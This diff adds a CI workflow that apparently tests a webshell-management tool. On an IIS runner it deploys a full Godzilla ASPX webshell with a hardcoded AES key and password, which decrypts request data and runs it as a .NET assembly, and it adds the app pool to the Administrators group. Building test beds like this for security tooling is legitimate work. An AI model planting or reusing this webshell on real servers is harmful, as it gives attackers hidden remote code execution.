@@ -1,0 +1,159 @@
+name: WebShell Tests
+
+on:
+  pull_request:
+    branches: [ main ]
+    types: [ opened, synchronize, reopened ]
+    paths:
+      - "common/wsm/**"
+      - "common/yakgrpc/yakit/webshell.go"
+      - ".github/workflows/wsm-test.yml"
+
+jobs:
+  setup-iis:
+    runs-on: windows-latest
+    steps:
+      - name: Checkout code
+        uses: actions/checkout@v4
+
+      - name: Setup IIS
+        shell: powershell
+        run: |
+          Import-Module WebAdministration
+          # https://github.com/Microsoft/aspnet-docker/issues/33
+          Add-LocalGroupMember -Group 'Administrators' -Member 'IIS AppPool\DefaultAppPool';
+          # 确保IIS功能已经被启用
+          Dism /online /Enable-Feature /FeatureName:IIS-WebServer
+          Dism /online /Enable-Feature /FeatureName:IIS-ASPNET45
+          Dism /online /Enable-Feature /FeatureName:IIS-DirectoryBrowsing
+      - name: Deploy Godzilla Aspx Aes base64 Shell
+        run: |
+          $directoryPath = "C:\inetpub\wwwroot\abcd"
+          $filePath1 = "$directoryPath\gbs64.aspx"
+          $filePath2 = "$directoryPath\gbs64.txt"
+          $content = @"
+          <%@ Page Language="C#" Debug="true" %>
+          <%@ Import Namespace="System.Reflection" %>
+          <%
+              try
+              {
+                  string key = "3c6e0b8a9c15224a";
+                  string pass = "pass";
+          
+                  string md5 = System.BitConverter.ToString(
+                      new System.Security.Cryptography.MD5CryptoServiceProvider()
+                          .ComputeHash(System.Text.Encoding.Default.GetBytes(pass + key))
+                      ).Replace("-", "");
+          
+                  byte[] data = System.Convert.FromBase64String(Context.Request[pass]);
+                  data = new System.Security.Cryptography.RijndaelManaged()
+                      .CreateDecryptor(System.Text.Encoding.Default.GetBytes(key), System.Text.Encoding.Default.GetBytes(key))
+                      .TransformFinalBlock(data, 0, data.Length);
+                  Console.WriteLine(System.Text.Encoding.Default.GetString(data));
+                  if (Context.Session["payload"] == null)
+                  {
+                      Assembly assembly = Assembly.Load(data);
+                      Type lyType = assembly.GetTypes()[1];
+                      Console.WriteLine(lyType);
+                      object lyInstance = Activator.CreateInstance(lyType);
+                      object result = lyInstance.Equals(data);
+                      Console.WriteLine("zzz :"+result); 
+                      Context.Session["payload"] = lyInstance;
+                  }
+                  else
+                  {
+                      object o = Context.Session["payload"];
+                      System.IO.MemoryStream outStream = new System.IO.MemoryStream();
+                      o.Equals(Context);
+                      o.Equals(outStream);
+                      o.Equals(data);
+                      o.ToString();
+                      byte[] r = outStream.ToArray();
+          
+                      Context.Response.Write(md5.Substring(0, 16));
+                      Context.Response.Write(System.Convert.ToBase64String(
+                          new System.Security.Cryptography.RijndaelManaged()
+                              .CreateEncryptor(System.Text.Encoding.Default.GetBytes(key), System.Text.Encoding.Default.GetBytes(key))
+                              .TransformFinalBlock(r, 0, r.Length)
+                          ));
+                      Context.Response.Write(md5.Substring(16));
+                  }
+              }
+              catch (System.Exception e)
+              {
+                  Console.WriteLine(e.ToString());
+              }
+          %>
+          "@
+          # Ensure the directory exists
+          if (-Not (Test-Path -Path $directoryPath)) {
+              New-Item -ItemType Directory -Path $directoryPath
+          }
+          
+          # Write content to files
+          $content | Out-File -FilePath $filePath1 -Encoding UTF8
+          $content | Out-File -FilePath $filePath2 -Encoding UTF8
+      - name: Deploy Echo Application
+        run: |
+          $directoryPath = "C:\inetpub\wwwroot\abcd"
+          $filePath1 = "$directoryPath\echo.aspx"
+          $filePath2 = "$directoryPath\echo.txt"
+          $content = @"
+          <%@ Page Language="C#" Debug="true" %>
+          <script runat="server">
+              protected void Page_Load(object sender, EventArgs e)
+              {
+                  Response.Write("Hello ASPX");
+              }
+          </script>
+          "@
+          # Ensure the directory exists
+          if (-Not (Test-Path -Path $directoryPath)) {
+              New-Item -ItemType Directory -Path $directoryPath
+          }
+          
+          # Write content to files
+          $content | Out-File -FilePath $filePath1 -Encoding UTF8
+          $content | Out-File -FilePath $filePath2 -Encoding UTF8
+      - name: Configure IIS using AppCmd
+        shell: cmd
+        run: |
+          @echo off
+          SET siteName=MyWebsite
+          SET appPoolName=DefaultAppPool
+          SET port=8087
+          SET physicalPath=C:\inetpub\wwwroot\abcd
+          
+          :: Check if the DefaultAppPool exists, add if it does not
+          %SystemRoot%\system32\inetsrv\appcmd list apppool /name:%appPoolName%
+          IF %ERRORLEVEL% == 1 (
+              %SystemRoot%\system32\inetsrv\appcmd add apppool /name:%appPoolName%
+          )
+          
+          :: Create or update the website
+          %SystemRoot%\system32\inetsrv\appcmd list site /name:%siteName%
+          IF %ERRORLEVEL% == 1 (
+            %SystemRoot%\system32\inetsrv\appcmd add site /name:%siteName% /bindings:http/*:%port%: /physicalPath:%physicalPath%
+          ) ELSE (
+            %SystemRoot%\system32\inetsrv\appcmd set site %siteName% /bindings:http/*:%port%: /physicalPath:%physicalPath%
+          )
+          
+          :: Associate the website with the application pool
+          %SystemRoot%\system32\inetsrv\appcmd set app "%siteName%/" /applicationPool:%appPoolName%
+          
+          :: Start the website
+          %SystemRoot%\system32\inetsrv\appcmd start site %siteName%
+      - name: Fetch and Display Content of echo.aspx
+        shell: powershell
+        run: |
+          $url = "http://127.0.0.1:8087/echo.aspx"
+          try {
+            $response = Invoke-WebRequest -Uri $url
+            Write-Output "Response Body:"
+            Write-Output $response.Content
+          } catch {
+            Write-Error "Failed to fetch URL $url. Error: $_"
+          }
+      - name: Run Tests
+        run: |
+          go test -timeout 20s -run TestNewGodzillaBase64Aspx ./common/wsm
